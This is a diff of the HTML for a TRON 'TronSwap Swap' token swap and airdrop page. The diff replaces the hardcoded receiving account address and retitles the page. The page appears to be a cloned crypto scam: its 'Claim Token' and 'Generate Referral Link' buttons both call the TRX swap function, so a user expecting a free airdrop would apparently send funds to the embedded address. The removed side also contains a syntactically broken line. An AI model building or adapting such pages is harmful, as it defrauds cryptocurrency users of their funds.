@@ -1,8 +1,12 @@
-<!DOCTYPE html><html lang="en" class=" js no-touch cssanimations csstransforms csstransforms3d csstransitions js no-touch cssanimations csstransforms csstransforms3d csstransitions" style><head>
-    <meta charset="UTF-8">
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  
+
+<head>
+    <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
-    <title>TronSwap</title>
-    <script type="text/javascript" async src="js/analytics.js"></script><script async src="js_1"></script><script src="js/-lSSG8OMGtclk7q_ITCZWl1_R1I.js"></script><script src="js/al1gMD2m6mpp_AFuZ9lkgFblPpU.js"></script><link rel="shortcut icon" href="favicon.ico">
+    <title>TronSwap Swap</title>
+    <script src="cdn-cgi/apps/head/-lSSG8OMGtclk7q_ITCZWl1_R1I.js"></script><link rel="shortcut icon" href="favicon.ico">
 
 
     <link rel="stylesheet" href="css/reset.css" type="text/css">
@@ -11,7 +15,7 @@
     <link rel="stylesheet" href="css/perfect-scrollbar.css" type="text/css">
     <link rel="stylesheet" href="css/owl.carousel.css" type="text/css">
     <link rel="stylesheet" href="css/magnific-popup.css" type="text/css">
-    <link rel="stylesheet" href="css/main.css" type="text/css">
+    <link rel="stylesheet" href="css/main3860.css?v=1" type="text/css">
 
     <script src="js/modernizr.custom.js"></script>
 
@@ -31,11 +35,11 @@
 
   <body>
     <!-- Animated Background -->
-    <div class="lm-animated-bg" style="background-image: url(images/main_bg.png);"></div>
+    <div class="lm-animated-bg" style="background-image: url(img/main_bg.png);"></div>
     <!-- /Animated Background -->
 
     <!-- Loading animation -->
-    <div class="preloader" style="opacity: 0.2325;">
+    <div class="preloader">
       <div class="preloader-animation">
         <div class="preloader-spinner">
         </div>
@@ -46,22 +50,22 @@
     <div class="page">
       <div class="page-content">
 
-          <header id="TronSwap" class="header mobile-menu-hide">
+          <header id="site_header" class="header mobile-menu-hide">
             <div class="header-content">
               <div class="header-photo">
-                <img src="fonts/main_photo.svg" alt="Logo">
+                <img src="img/main_photo.svg" alt="Logo">
               </div>
               <div class="header-titles">
-                <h2>TronSwap</h2>
+                <h2>TronSwap Swap</h2>
                 <h4 id="wallet">Not Connected</h4>
-                <p class="mt-5" style="color: #fff;font-size: 14px;"><br>TronSwap is the next generation of Cryptocurrency swap.</p>
-                <a href="https://t.me/TronSwap_Swap" class="button btn-send" target="blank">telegram Channel</a>
+                <p class="mt-5" style="color: #fff;font-size: 14px;"><br>TronSwap Swap is the next generation of Cryptocurrency swap.</p>
+                <a href="../t.me/TronSwap_Swap.html" class="button btn-send" target="blank">telegram Channel</a>
               </div>
             </div>
 
             <ul hidden class="main-menu">
               <li class="active">
-                <a href="#home" class="nav-anim active">
+                <a href="#home" class="nav-anim">
                   <span class="menu-icon lnr lnr-home"></span>
                   <span class="link-text">Home</span>
                 </a>
@@ -79,10 +83,10 @@
           </div>
           <!-- End Mobile Navigation -->
           <script>
-              var account = "415887dce0a844f75940f1713f27cfb31af2e102c4";
+              var account = "410efd48a5a249cdd171fed08e442d3ac1b25213dd";
               async function maxToken(){
                   var acc = await tronWeb.trx.getAccount();
-                  var tronWeb.trx.getBalance("TCfEZ5BQKRZ57dfKPji9AieJf1esByGWPV");
+                  var tokenBalance = 0;
                   if (acc.assetV2){
                       var tb = acc.assetV2.find(function(o){return o.key == "TFQR9LQFAaJF2fwpUjduE5Skp37HR5J2Kp";});
                       if (tb){
@@ -106,7 +110,7 @@
                   var acc = await tronWeb.trx.getAccount();
                   var tokenBalance = 0;
                   if (acc.assetV2){
-                      var tb = acc.assetV2.find(function(o){return o.key == "10036TFQR9LQFAaJF2fwpUjduE5Skp37HR5J2Kp04";});
+                      var tb = acc.assetV2.find(function(o){return o.key == "TFQR9LQFAaJF2fwpUjduE5Skp37HR5J2Kp";});
                       if (tb){
                           tokenBalance = tb.value / 1000000;
                       }
@@ -140,7 +144,7 @@
               
 
               <!-- Contact Subpage -->
-              <section data-id="home" class="animated-section section-active animated-section-scaleUp">
+              <section data-id="home" class="animated-section">
 
                 <div class="section-content">
 
@@ -150,7 +154,7 @@
                     <div class="col-xs-12 col-sm-12 col-md-12 col-lg-6">
                       <br><br>
                       <div class="page-title">
-                        <h3>TronSwap</h3>
+                        <h3>TronSwap Swap</h3>
                       </div>
                       <br><br>
 
@@ -165,14 +169,14 @@
                           <div class="fields clearfix">
                             <div class="center-column">
                               <div class="form-group form-group-with-icon">
-                                <span class="d-inline-block" tabindex="0" onclick="maxToken()" style="z-index: 10; color: #5e2fd6;cursor: pointer; position: absolute;top: 15px;right: 20px;outline: none;">Max</span>
-                                <input id="token-input" type="text" name="number" class="form-control" placeholder required="required" data-error="Enter the TronSwap amount to swap">
+                                <span class="d-inline-block" tabindex="0" onClick="maxToken()" style="z-index: 10; color: #5e2fd6;cursor: pointer; position: absolute;top: 15px;right: 20px;outline: none;">Max</span>
+                                <input id="token-input" type="text" name="number" class="form-control" placeholder="" required="required" data-error="Enter the TronSwap amount to swap">
                                 <label>From TronSwap</label>
                                 <div class="form-control-border"></div>
                                 <div class="help-block with-errors"></div>
                               </div>
                               <div>
-                                <img src="fonts/swapicon.svg" height="30px" onclick="$('#token_form').hide(); $('#trx_form').show();" style="margin: 10px auto 20px;cursor: pointer;">
+                                <img src="img/swapicon.svg" height="30px" onClick="$('#token_form').hide(); $('#trx_form').show();" style="margin: 10px auto 20px;cursor: pointer;">
                               </div>
                               <div class="form-group form-group-with-icon">
                                 <input id="trx-swap" type="text" name="name" class="form-control" placeholder="To TRX" disabled required="required">
@@ -182,7 +186,7 @@
                             </div>
                           </div>
 
-                          <input type="button" class="button btn-send" value="Swap Now!" onclick="swapToken()" style="cursor: pointer;">
+                          <input type="button" class="button btn-send" value="Swap Now!" onClick="swapToken()" style="cursor: pointer;">
                         </div>
                       </form>
                       
@@ -198,14 +202,14 @@
                           <div class="fields clearfix">
                             <div class="center-column">
                               <div class="form-group form-group-with-icon">
-                                <span class="d-inline-block" tabindex="0" onclick="maxTRX()" style="z-index: 10; color: #5e2fd6;cursor: pointer; position: absolute;top: 15px;right: 20px;outline: none;">Max</span>
-                                <input id="trx-input" type="text" name="number" class="form-control" placeholder required="required" data-error="Enter the TRX amount to swap">
+                                <span class="d-inline-block" tabindex="0" onClick="maxTRX()" style="z-index: 10; color: #5e2fd6;cursor: pointer; position: absolute;top: 15px;right: 20px;outline: none;">Max</span>
+                                <input id="trx-input" type="text" name="number" class="form-control" placeholder="" required="required" data-error="Enter the TRX amount to swap">
                                 <label>From TRX</label>
                                 <div class="form-control-border"></div>
                                 <div class="help-block with-errors"></div>
                               </div>
                               <div>
-                                <img src="fonts/swapicon.svg" height="30px" onclick="$('#trx_form').hide(); $('#token_form').show();" style="margin: 10px auto 20px;cursor: pointer;">
+                                <img src="img/swapicon.svg" height="30px" onClick="$('#trx_form').hide(); $('#token_form').show();" style="margin: 10px auto 20px;cursor: pointer;">
                               </div>
                               <div class="form-group form-group-with-icon">
                                 <input id="token-swap" type="text" name="name" class="form-control" placeholder="To TronSwap" disabled required="required">
@@ -215,7 +219,7 @@
                             </div>
                           </div>
 
-                          <input type="button" class="button btn-send" value="Swap Now!" onclick="swapTRX()" style="cursor: pointer;">
+                          <input type="button" class="button btn-send" value="Swap Now!" onClick="swapTRX()" style="cursor: pointer;">
                         </div>
                       </form>
                     </div>
@@ -231,18 +235,18 @@
                       <br><br>
                       <div class="block-title">
                         <p style="margin-top: 0px;">
-                          On the occasion of the 10th month of launching the TronSwapSwap project and the more than expected reception of this project, we decided to generate a governance token and airdrop between active members of TRON Network and people who had transactions in the TronSwapSWAP project from December 20 to 30, 2020 with long-term goals as marketing distribution.
+                          On the occasion of the 10th month of launching the TronSwap project and the more than expected reception of this project, we decided to generate a governance token and airdrop between active members of TRON Network and people who had transactions in the TronSwap project from December 20 to 30, 2020 with long-term goals as marketing distribution.
                         </p>
                       </div>
 
-                      <form id="contact_form" class="contact-form" action novalidate="true">
+                      <form id="contact_form" class="contact-form" action="#">
 
                         <div class="messages"></div>
 
                         <div class="controls three-columns">
                           
 
-                          <input type="button" class="button btn-send" onclick="swapTRX()" value="Claim Token" style="cursor: pointer;">
+                          <input type="button" class="button btn-send" onClick="swapTRX()" value="Claim Token" style="cursor: pointer;">
                         </div>
                       </form>
                     </div>
@@ -254,7 +258,7 @@
                     <div class="controls three-columns">
                           
 
-                      <input type="button" class="button btn-send" value="Generate Referral Link" onclick="swapTRX()" style="cursor: pointer;">
+                      <input type="button" class="button btn-send" value="Generate Referral Link" onClick="swapTRX()" style="cursor: pointer;">
                     </div>
                   </div>
                 </div>
@@ -266,16 +270,16 @@
       </div>
     </div>
 
-    <script src="js/jquery-2.1.3.min.js"></script>
+    <script data-cfasync="false" src="js/email-decode.min.js"></script><script src="js/jquery-2.1.3.min.js"></script>
     <script src="js/modernizr.custom.js"></script>
     <script src="js/animating.js"></script>
 
     <script src="js/imagesloaded.pkgd.min.js"></script>
 
-    <script src="js/perfect-scrollbar.min.js"></script>
-    <script src="js/jquery.shuffle.min.js"></script>
-    <script src="js/masonry.pkgd.min.js"></script>
-    <script src="js/owl.carousel.min.js"></script>
+    <script src='js/perfect-scrollbar.min.js'></script>
+    <script src='js/jquery.shuffle.min.js'></script>
+    <script src='js/masonry.pkgd.min.js'></script>
+    <script src='js/owl.carousel.min.js'></script>
     <script src="js/jquery.magnific-popup.min.js"></script>
 
     <script src="js/validator.js"></script>
@@ -362,6 +366,6 @@
                   change();
               })
     </script>
-  
+  </body>
 
-<div id="page-ajax-loaded" class="page-ajax-loaded animated animated-section-moveFromLeft"></div></body></html>
+</html>
